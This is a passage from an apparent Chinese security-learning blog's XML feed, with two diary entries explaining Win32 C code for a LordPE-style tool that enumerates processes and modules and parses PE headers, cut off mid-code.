href="https://hosch3n.github.io/2020/12/16/%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%9A%90%E8%97%8FCobaltstrike%E6%9C%8D%E5%8A%A1%E5%99%A8/">https://hosch3n.github.io/2020/12/16/%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%9A%90%E8%97%8FCobaltstrike%E6%9C%8D%E5%8A%A1%E5%99%A8/</a></p><p>文章也同步到了我的个人博客，师傅们也可以来<a href="https://m0ck1ng-b1rd.github.io/">瞅瞅</a>…</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>Tools</category>
      
      <category>CS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>投稿</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PETOOL开发日记1 - 进程查看</title>
    <link href="/2022/02/20/%E4%BA%8C%E8%BF%9B%E5%88%B6/PE%20Tool%20%E5%BC%80%E5%8F%91%E6%97%A5%E8%AE%B0%201%20-%20%E8%BF%9B%E7%A8%8B%E6%9F%A5%E7%9C%8B/"/>
    <url>/2022/02/20/%E4%BA%8C%E8%BF%9B%E5%88%B6/PE%20Tool%20%E5%BC%80%E5%8F%91%E6%97%A5%E8%AE%B0%201%20-%20%E8%BF%9B%E7%A8%8B%E6%9F%A5%E7%9C%8B/</url>
    
    <content type="html"><![CDATA[<p>这是滴水逆向三期的第一个项目，我们将仿造LordPE制作自己的PE解析工具，从而提升Win32正向能力并对Win32 API有更深入的认识</p><p>本节将初步完成主界面的进程查看功能，上面的List Control控件列出了系统内的所有进程，当点击某一进程时，下面的List Control将会列出该进程使用的模块（DLL）。点击PE查看按钮可以打开磁盘上的PE文件并查看PE的详细内容。</p><p>主界面设计如下：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/PE%20Tool%20%E5%BC%80%E5%8F%91%E6%97%A5%E8%AE%B0%201%20-%20%E8%BF%9B%E7%A8%8B%E6%9F%A5%E7%9C%8B.assets/image-20220110210610950.png" alt="image-20220110210610950"></p><p>在主界面中，我们需要在对话框初始化的时候填充数据，亦即在接收到WM_INITDIALOG消息时填充数据。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL CALLBACK <span class="hljs-title function_">MainDialogProc</span><span class="hljs-params">(</span><br><span class="hljs-params">HWND hwndDlg,  <span class="hljs-comment">// handle to dialog box</span></span><br><span class="hljs-params">UINT uMsg,     <span class="hljs-comment">// message</span></span><br><span class="hljs-params">WPARAM wParam, <span class="hljs-comment">// first message parameter</span></span><br><span class="hljs-params">LPARAM lParam  <span class="hljs-comment">// second message parameter</span></span><br><span class="hljs-params">)</span><br>&#123;<br><span class="hljs-keyword">switch</span>(uMsg)<br>&#123;<br><span class="hljs-keyword">case</span>  WM_INITDIALOG :<br>&#123;<br>InitProcessListView(hwndDlg);<br>InitProcessModuleView(hwndDlg);<br><span class="hljs-keyword">return</span> TRUE ;<br>&#125;<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>其中两个函数如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs c">VOID <span class="hljs-title function_">InitProcessListView</span><span class="hljs-params">(HWND hDlg)</span>&#123;<br><span class="hljs-comment">//1、初始化列名信息：</span><br>LV_COLUMN lv;<br>HWND hListProcess;<br><br><span class="hljs-comment">//初始化</span><br><span class="hljs-built_in">memset</span>(&amp;lv,<span class="hljs-number">0</span>,<span class="hljs-keyword">sizeof</span>(LV_COLUMN));<br><span class="hljs-comment">//获取IDC_LIST_PROCESS句柄</span><br>hListProcess = GetDlgItem(hDlg,IDC_LIST_PROCESS);<br><span class="hljs-comment">//设置整行选中</span><br>SendMessage(hListProcess,LVM_SETEXTENDEDLISTVIEWSTYLE,LVS_EX_FULLROWSELECT,LVS_EX_FULLROWSELECT);<br><br><span class="hljs-comment">//第一列</span><br>lv.mask = LVCF_TEXT | LVCF_WIDTH | LVCF_SUBITEM;<br>lv.pszText = _T(<span class="hljs-string">&quot;PID&quot;</span>);<span class="hljs-comment">//列标题</span><br>lv.cx = <span class="hljs-number">50</span>;<br>lv.iSubItem = <span class="hljs-number">0</span>;<br>ListView_InsertColumn(hListProcess, <span class="hljs-number">0</span>, &amp;lv);<br><span class="hljs-comment">//第二列</span><br>lv.pszText = _T(<span class="hljs-string">&quot;进程名&quot;</span>);<br>lv.cx = <span class="hljs-number">100</span>;<br>lv.iSubItem = <span class="hljs-number">1</span>;<br>ListView_InsertColumn(hListProcess, <span class="hljs-number">1</span>, &amp;lv);<br><span class="hljs-comment">//第三列</span><br>lv.pszText = _T(<span class="hljs-string">&quot;进程地址&quot;</span>);<br>lv.cx = <span class="hljs-number">100</span>;<br>lv.iSubItem = <span class="hljs-number">2</span>;<br>ListView_InsertColumn(hListProcess, <span class="hljs-number">2</span>, &amp;lv);<br><span class="hljs-comment">//第四列</span><br>lv.pszText = _T(<span class="hljs-string">&quot;镜像基址&quot;</span>);<br>lv.cx = <span class="hljs-number">100</span>;<br>lv.iSubItem = <span class="hljs-number">3</span>;<br>ListView_InsertColumn(hListProcess, <span class="hljs-number">3</span>, &amp;lv);<br><span class="hljs-comment">//第五列</span><br>lv.pszText = _T(<span class="hljs-string">&quot;镜像大小&quot;</span>);<br>lv.cx = <span class="hljs-number">100</span>;<br>lv.iSubItem = <span class="hljs-number">4</span>;<br>ListView_InsertColumn(hListProcess, <span class="hljs-number">4</span>, &amp;lv);<br><br><br><br><span class="hljs-comment">// 调用API获取所有的进程信息</span><br>DWORD procPid[<span class="hljs-number">1024</span>], retnBytes, procCount, retnBytes2;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i;<br>HMODULE hMod[<span class="hljs-number">1024</span>];<br>HANDLE hProcess;<br>TCHAR szModAbsPath[MAX_PATH];<br><br><span class="hljs-comment">// 构造ListView使用的变量</span><br>LPSTR processData[<span class="hljs-number">5</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>LPSTR moduleName; <br>TCHAR processId[<span class="hljs-number">100</span>]; <br>TCHAR imageBase[<span class="hljs-number">100</span>]; <br>TCHAR sizeOfImage[<span class="hljs-number">100</span>]; <br>LPSTR delim;<br><br><span class="hljs-keyword">if</span> (EnumProcesses(procPid, <span class="hljs-keyword">sizeof</span>(procPid), &amp;retnBytes))<br>&#123;<br>procCount = retnBytes / <span class="hljs-keyword">sizeof</span>(DWORD);<br>SetProcessPrivilege(<span class="hljs-string">&quot;SeDebugPrivilege&quot;</span>, <span class="hljs-number">1</span>);<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; procCount; i++)<br>&#123;<br>hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, procPid[i]);<br><span class="hljs-keyword">if</span> (hProcess != <span class="hljs-literal">NULL</span>)<br>&#123;<br>EnumProcessModules(hProcess, hMod, <span class="hljs-keyword">sizeof</span>(hMod), &amp;retnBytes2);<br>GetModuleFileNameEx(hProcess, hMod[<span class="hljs-number">0</span>], szModAbsPath, <span class="hljs-keyword">sizeof</span>(szModAbsPath));<br><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(szModAbsPath, _T(<span class="hljs-string">&quot;\\SystemRoot&quot;</span>)) != <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-type">char</span>* szModNameTemp = strrep(szModAbsPath,_T(<span class="hljs-string">&quot;\\SystemRoot&quot;</span>),_T(<span class="hljs-string">&quot;C:\\Windows&quot;</span>));<br><span class="hljs-built_in">strcpy</span>(szModAbsPath, szModNameTemp);<br>&#125;<br><br><span class="hljs-comment">// 打开文件，获取可选PE头</span><br>ReadPEFile(szModAbsPath, &amp;pFileBuffer);<br>pDosHeader = (PIMAGE_DOS_HEADER) pFileBuffer;<br>pNTHeader = (PIMAGE_NT_HEADERS) ((DWORD) pFileBuffer + pDosHeader-&gt;e_lfanew);<br>pFileHeader = (PIMAGE_FILE_HEADER) (((DWORD) pNTHeader) + <span class="hljs-number">4</span>);<br>pOptionHeader = (PIMAGE_OPTIONAL_HEADER32) ((DWORD) pFileHeader + IMAGE_SIZEOF_FILE_HEADER);<br><br><br><span class="hljs-comment">// 插入信息到ListView中</span><br><span class="hljs-built_in">sprintf</span>(processId, _T(<span class="hljs-string">&quot;%d&quot;</span>), procPid[i]);<br>processData[<span class="hljs-number">0</span>] = processId;<br><br>delim = _T(<span class="hljs-string">&quot;\\&quot;</span>);<br>moduleName = CutAndGetLast(szModAbsPath, delim);<br>processData[<span class="hljs-number">1</span>] = moduleName;<br><br>processData[<span class="hljs-number">2</span>] = szModAbsPath;<br><br><span class="hljs-built_in">sprintf</span>(imageBase, _T(<span class="hljs-string">&quot;0x%08X&quot;</span>),  pOptionHeader-&gt;ImageBase);<br>processData[<span class="hljs-number">3</span>] =imageBase;<br><br><span class="hljs-built_in">sprintf</span>(sizeOfImage, _T(<span class="hljs-string">&quot;0x%08X&quot;</span>), pOptionHeader-&gt;SizeOfImage);<br>processData[<span class="hljs-number">4</span>] = sizeOfImage;<br><br>InsertRow(hListProcess, processData);<br><span class="hljs-comment">//printf(&quot;PID=%d Path=%s\n&quot;, procPid[i], szModName);</span><br><br><span class="hljs-built_in">free</span>(pFileBuffer);<br>&#125;<br>CloseHandle(hProcess);<br>&#125;<br>SetProcessPrivilege(<span class="hljs-string">&quot;SeDebugPrivilege&quot;</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>InitProcessModuleView只是插入了列，具体的行将在点击某一列出的行时才会往其中填充数据。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c">VOID <span class="hljs-title function_">InitProcessModuleView</span><span class="hljs-params">(HWND hDlg)</span>&#123;<br><span class="hljs-comment">//1、初始化列名信息：</span><br>LV_COLUMN lv;<br>HWND hModuleProcess;<br><br><span class="hljs-comment">//初始化</span><br><span class="hljs-built_in">memset</span>(&amp;lv,<span class="hljs-number">0</span>,<span class="hljs-keyword">sizeof</span>(LV_COLUMN));<br><span class="hljs-comment">//获取IDC_LIST_MODULE句柄</span><br>hModuleProcess = GetDlgItem(hDlg,IDC_LIST_MODULE);<br><span class="hljs-comment">//设置整行选中</span><br>SendMessage(hModuleProcess,LVM_SETEXTENDEDLISTVIEWSTYLE,LVS_EX_FULLROWSELECT,LVS_EX_FULLROWSELECT);<br><br><span class="hljs-comment">//第一列</span><br>lv.mask = LVCF_TEXT | LVCF_WIDTH | LVCF_SUBITEM;<br>lv.pszText = _T(<span class="hljs-string">&quot;模块名称&quot;</span>);<span class="hljs-comment">//列标题</span><br>lv.cx = <span class="hljs-number">150</span>;<br>lv.iSubItem = <span class="hljs-number">0</span>;<br><span class="hljs-comment">//ListView_InsertColumn(hListProcess, 0, &amp;lv);</span><br>SendMessage(hModuleProcess,LVM_INSERTCOLUMN,<span class="hljs-number">0</span>,(DWORD)&amp;lv);<br><span class="hljs-comment">//第二列</span><br>lv.pszText = _T(<span class="hljs-string">&quot;模块位置&quot;</span>);<br>lv.cx = <span class="hljs-number">200</span>;<br>lv.iSubItem = <span class="hljs-number">1</span>;<br><span class="hljs-comment">// 两个函数是一样的，ListView_InsertColumn是一个宏</span><br><span class="hljs-comment">//ListView_InsertColumn(hListProcess, 1, &amp;lv);</span><br>SendMessage(hModuleProcess,LVM_INSERTCOLUMN,<span class="hljs-number">1</span>,(DWORD)&amp;lv);<br>&#125;<br></code></pre></td></tr></table></figure><p>当点击List Control中某一行时，将会产生一个WM_NOTIFY消息，通过该消息我们可以获得选中的行的信息，接下来就可以调用函数获取PID进而获取信息。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL CALLBACK <span class="hljs-title function_">MainDialogProc</span><span class="hljs-params">(</span><br><span class="hljs-params">HWND hwndDlg,  <span class="hljs-comment">// handle to dialog box</span></span><br><span class="hljs-params">UINT uMsg,     <span class="hljs-comment">// message</span></span><br><span class="hljs-params">WPARAM wParam, <span class="hljs-comment">// first message parameter</span></span><br><span class="hljs-params">LPARAM lParam  <span class="hljs-comment">// second message parameter</span></span><br><span class="hljs-params">)</span><br>&#123;<br><span class="hljs-keyword">switch</span>(uMsg)<br>&#123;<br><span class="hljs-keyword">case</span> WM_NOTIFY:<br>&#123;<br>NMHDR* pNMHDR = (NMHDR*) lParam;<br><span class="hljs-keyword">if</span>(wParam == IDC_LIST_PROCESS &amp;&amp; pNMHDR-&gt;code == NM_CLICK)&#123;<br>EnumModule(hwndDlg,wParam,lParam);<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>...<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs c">VOID <span class="hljs-title function_">EnumModule</span><span class="hljs-params">(HWND hDlg, WPARAM wParam, LPARAM lParam)</span>&#123;<br>HWND hListProcess = GetDlgItem(hDlg,IDC_LIST_PROCESS);<br>DWORD dwRowId;<br>TCHAR szPid[<span class="hljs-number">0x20</span>];<br>LV_ITEM lv;<br><br><span class="hljs-comment">// 初始化</span><br><span class="hljs-built_in">memset</span>(szPid, <span class="hljs-number">0</span> ,<span class="hljs-number">0x20</span>);<br><span class="hljs-built_in">memset</span>(&amp;lv,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>);<br><span class="hljs-comment">// 获取选择行</span><br>dwRowId = SendMessage(hListProcess, LVM_GETNEXTITEM, <span class="hljs-number">-1</span>, LVNI_SELECTED);<br><span class="hljs-keyword">if</span> (dwRowId == <span class="hljs-number">-1</span>)<br>&#123;<br>MessageBox(<span class="hljs-literal">NULL</span>, _T(<span class="hljs-string">&quot;请选择进程&quot;</span>), _T(<span class="hljs-string">&quot;出错啦&quot;</span>), MB_OK);<br><span class="hljs-keyword">return</span> ;<br>&#125;<br><span class="hljs-comment">// 获取PID</span><br>lv.iSubItem = <span class="hljs-number">0</span>;<br>lv.pszText = szPid;<br>lv.cchTextMax = <span class="hljs-number">0x20</span>;<br>SendMessage(hListProcess, LVM_GETITEMTEXT, dwRowId, (DWORD)&amp;lv);<br><br><br><span class="hljs-comment">// 根据PID调用API获取进程模块</span><br>HWND hListModule = GetDlgItem(hDlg,IDC_LIST_MODULE);<br>HMODULE hMods[<span class="hljs-number">1024</span>];<br>HANDLE hProcess;<br>DWORD cbNeeded;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i;<br><br>LPSTR rowData[<span class="hljs-number">2</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>LPSTR delim;<br>LPSTR moduleName;<br><br><span class="hljs-comment">// Get a handle to the process.</span><br>DWORD processID = atoi(szPid);<br>SetProcessPrivilege(<span class="hljs-string">&quot;SeDebugPrivilege&quot;</span>, <span class="hljs-number">1</span>);<br>hProcess = OpenProcess( PROCESS_QUERY_INFORMATION |<br>PROCESS_VM_READ,<br>FALSE, processID );<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == hProcess)<br>MessageBox(<span class="hljs-literal">NULL</span>, _T(<span class="hljs-string">&quot;无法获取进程模块信息！&quot;</span>), _T(<span class="hljs-string">&quot;出错啦&quot;</span>), MB_OK);<br><br><span class="hljs-comment">// Get a list of all the modules in this process.</span><br><br><span class="hljs-keyword">if</span>( EnumProcessModules(hProcess, hMods, <span class="hljs-keyword">sizeof</span>(hMods), &amp;cbNeeded))<br>&#123;<br><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; (cbNeeded / <span class="hljs-keyword">sizeof</span>(HMODULE)); i++ )<br>&#123;<br>TCHAR szModName[MAX_PATH];<br><br><span class="hljs-comment">// Get the full path to the module&#x27;s file.</span><br><br><span class="hljs-keyword">if</span> ( GetModuleFileNameEx( hProcess, hMods[i], szModName,<br><span class="hljs-keyword">sizeof</span>(szModName) / <span class="hljs-keyword">sizeof</span>(TCHAR)))<br>&#123;<br>delim = _T(<span class="hljs-string">&quot;\\&quot;</span>);<br>moduleName = CutAndGetLast(szModName , delim);<br>rowData[<span class="hljs-number">0</span>] = moduleName;<br><br><br>rowData[<span class="hljs-number">1</span>] = szModName;<br>InsertRow(hListModule, rowData);<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// Release the handle to the process.</span><br>SetProcessPrivilege(<span class="hljs-string">&quot;SeDebugPrivilege&quot;</span>, <span class="hljs-number">1</span>);<br>CloseHandle( hProcess );<br>&#125;<br></code></pre></td></tr></table></figure><p>自此，枚举进程的功能已经大体完成，示意如下：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/PE%20Tool%20%E5%BC%80%E5%8F%91%E6%97%A5%E8%AE%B0%201%20-%20%E8%BF%9B%E7%A8%8B%E6%9F%A5%E7%9C%8B.assets/image-20220110212439217.png" alt="image-20220110212439217"></p><p>具体的代码已经放到<a href="https://github.com/M0cK1nG-b1Rd/MyLordPE">Github</a>上了。</p>]]></content>
    
    
    <categories>
      
      <category>Binary</category>
      
      <category>滴水学习</category>
      
      <category>项目开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Binary</tag>
      
      <tag>Win32</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PETOOL开发日记2 - PE文件查看</title>
    <link href="/2022/02/20/%E4%BA%8C%E8%BF%9B%E5%88%B6/PE%20Tool%20%E5%BC%80%E5%8F%91%E6%97%A5%E8%AE%B0%202%20-%20PE%E6%96%87%E4%BB%B6%E6%9F%A5%E7%9C%8B/"/>
    <url>/2022/02/20/%E4%BA%8C%E8%BF%9B%E5%88%B6/PE%20Tool%20%E5%BC%80%E5%8F%91%E6%97%A5%E8%AE%B0%202%20-%20PE%E6%96%87%E4%BB%B6%E6%9F%A5%E7%9C%8B/</url>
    
    <content type="html"><![CDATA[<p>本节将进一步完善PE TOOL的功能，添加对PE头的初步解析。</p><p>当点击主界面的PE查看按钮后，将弹出文件选择界面，为此需要编写相应的消息处理函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL CALLBACK <span class="hljs-title function_">MainDialogProc</span><span class="hljs-params">(</span><br><span class="hljs-params">HWND hwndDlg,  <span class="hljs-comment">// handle to dialog box</span></span><br><span class="hljs-params">UINT uMsg,     <span class="hljs-comment">// message</span></span><br><span class="hljs-params">WPARAM wParam, <span class="hljs-comment">// first message parameter</span></span><br><span class="hljs-params">LPARAM lParam  <span class="hljs-comment">// second message parameter</span></span><br><span class="hljs-params">)</span><br>&#123;<br><br>OPENFILENAME stopenFile;<br><span class="hljs-keyword">switch</span>(uMsg)<br>&#123;<br><br>...<br><span class="hljs-keyword">case</span>  WM_COMMAND :<br>&#123;<br><span class="hljs-keyword">switch</span> (LOWORD (wParam))<br>&#123;<br><span class="hljs-keyword">case</span>   IDC_BUTTON_QUIT :<br>EndDialog(hwndDlg, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">return</span> TRUE;<br><span class="hljs-keyword">case</span>   IDC_BUTTON_PEVIEW :<br>TCHAR szPeFileExt[<span class="hljs-number">100</span>] = _T(<span class="hljs-string">&quot;PE 文件(*.exe;*.dll;*.scr;*.drv;*.sys)\0*.exe;*.dll;*.scr;*.drv;*.sys\0All Files(*.*)\0*.*\0\0&quot;</span>);<br><br><span class="hljs-built_in">memset</span>(szFileName,<span class="hljs-number">0</span>,<span class="hljs-number">256</span>);<br><span class="hljs-built_in">memset</span>(&amp;stopenFile, <span class="hljs-number">0</span>,<span class="hljs-keyword">sizeof</span> (OPENFILENAME));<br>stopenFile.lStructSize = <span class="hljs-keyword">sizeof</span>(OPENFILENAME);<br>stopenFile.Flags = OFN_FILEMUSTEXIST|OFN_PATHMUSTEXIST;<br>stopenFile.hwndOwner = hwndDlg;<br>stopenFile.lpstrFilter = szPeFileExt;<br>stopenFile.lpstrFile = szFileName;<br>stopenFile.nMaxFile =MAX_PATH;<br>GetOpenFileName (&amp;stopenFile);<br><span class="hljs-comment">//打开新的对话框</span><br><span class="hljs-keyword">if</span> (szFileName != <span class="hljs-literal">NULL</span>)<br>&#123;<br>DialogBox(hAppInstance, MAKEINTRESOURCE(IDD_DIALOG_PEVIEW),hwndDlg,PeViewDialogProc);<br>&#125;<br><br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-keyword">return</span> FALSE ;<br>&#125;<br>...<br><br>&#125;<br></code></pre></td></tr></table></figure><p>选择PE文件后将弹出PE信息查看窗口对该PE文件进行初步解析。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/PE%20Tool%20%E5%BC%80%E5%8F%91%E6%97%A5%E8%AE%B0%202%20-%20PE%E6%96%87%E4%BB%B6%E6%9F%A5%E7%9C%8B.assets/image-20220110213214966.png" alt="image-20220110213214966"></p><p>该对话框的消息处理函数为PeViewDialogProc，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL CALLBACK <span class="hljs-title function_">PeViewDialogProc</span><span class="hljs-params">(</span><br><span class="hljs-params">HWND hwndDlg,  <span class="hljs-comment">// handle to dialog box</span></span><br><span class="hljs-params">UINT uMsg,     <span class="hljs-comment">// message</span></span><br><span class="hljs-params">WPARAM wParam, <span class="hljs-comment">// first message parameter</span></span><br><span class="hljs-params">LPARAM lParam  <span class="hljs-comment">// second message parameter</span></span><br><span class="hljs-params">)</span><br>&#123;<br><span class="hljs-keyword">switch</span>(uMsg)<br>&#123;<br><span class="hljs-keyword">case</span>  WM_INITDIALOG :<br>&#123;<br>InitPeView(hwndDlg);<br><span class="hljs-keyword">return</span> TRUE ;<br>&#125;<br><br><span class="hljs-keyword">case</span>  WM_COMMAND :<br>&#123;<br><span class="hljs-keyword">switch</span> (LOWORD (wParam))<br>&#123;<br><span class="hljs-keyword">case</span>   IDC_BUTTON_PEVIEW_CLOSE :<br>EndDialog(hwndDlg, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">return</span> TRUE;<br><span class="hljs-keyword">case</span>   IDC_BUTTON_PEVIEW_SECTION :<br>DialogBox(hAppInstance, MAKEINTRESOURCE(IDD_DIALOG_SECTION),hwndDlg,SectionDialogProc);<br><span class="hljs-keyword">return</span> TRUE;<br><span class="hljs-keyword">case</span>   